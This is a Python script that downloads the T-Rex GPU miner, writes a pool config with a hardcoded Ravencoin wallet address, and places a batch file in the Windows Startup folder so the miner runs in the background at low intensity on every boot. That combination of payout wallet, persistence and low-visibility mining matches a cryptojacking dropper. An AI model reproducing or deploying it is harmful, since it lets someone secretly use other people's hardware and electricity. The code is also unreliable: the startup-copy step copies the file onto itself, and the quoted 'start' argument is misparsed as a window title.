import os
import requests
import zipfile
import shutil

# Constants
TREX_URL = "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip"
DOWNLOAD_DIR = os.path.expanduser("~\\Downloads")
MINER_DIR = os.path.join(DOWNLOAD_DIR, "t-rex-miner")
STARTUP_DIR = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
BATCH_FILE_PATH = os.path.join(STARTUP_DIR, "start_miner.bat")
CONFIG_FILE_PATH = os.path.join(MINER_DIR, "config.txt")
WALLET_ADDRESS = "RAU9wAVeArasGAqkaHXeaG4yJ6YUFJbfMY"

# Download T-Rex Miner
def download_trex():
    try:
        print("Downloading T-Rex Miner...")
        response = requests.get(TREX_URL, stream=True)
        response.raise_for_status()
        zip_path = os.path.join(DOWNLOAD_DIR, "t-rex.zip")
        with open(zip_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return zip_path
    except requests.exceptions.RequestException as e:
        print(f"Error downloading T-Rex Miner: {e}")
        return None

# Extract T-Rex Miner
def extract_trex(zip_path):
    try:
        print("Extracting T-Rex Miner...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(MINER_DIR)
        os.remove(zip_path)
    except zipfile.BadZipFile as e:
        print(f"Error extracting T-Rex Miner: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Create Config File
def create_config():
    print("Creating config file...")
    config_content = f"""
    algo=rvn2
    pool=stratum+tcp://rvn.nanopool.org:3333
    user={WALLET_ADDRESS}
    intensity=1
    """
    with open(CONFIG_FILE_PATH, 'w') as f:
        f.write(config_content)

# Create Batch File
def create_batch():
    print("Creating batch file...")
    batch_content = f"""
    @echo off
    REM Start T-Rex miner with low intensity to use minimal GPU power
    start /b "{MINER_DIR}\\t-rex.exe" -c "{CONFIG_FILE_PATH}"
    exit
    """
    with open(BATCH_FILE_PATH, 'w') as f:
        f.write(batch_content)

# Add Batch File to Startup
def add_to_startup():
    print("Adding batch file to startup...")
    shutil.copy(BATCH_FILE_PATH, STARTUP_DIR)

# Main Function
def main():
    if not os.path.exists(MINER_DIR):
        os.makedirs(MINER_DIR)

    zip_path = download_trex()
    if zip_path:
        extract_trex(zip_path)
        create_config()
        create_batch()
        add_to_startup()
        print("Setup complete. T-Rex miner will run in the background on startup.")
    else:
        print("Setup failed. Please check the error messages.")

if __name__ == "__main__":
    main()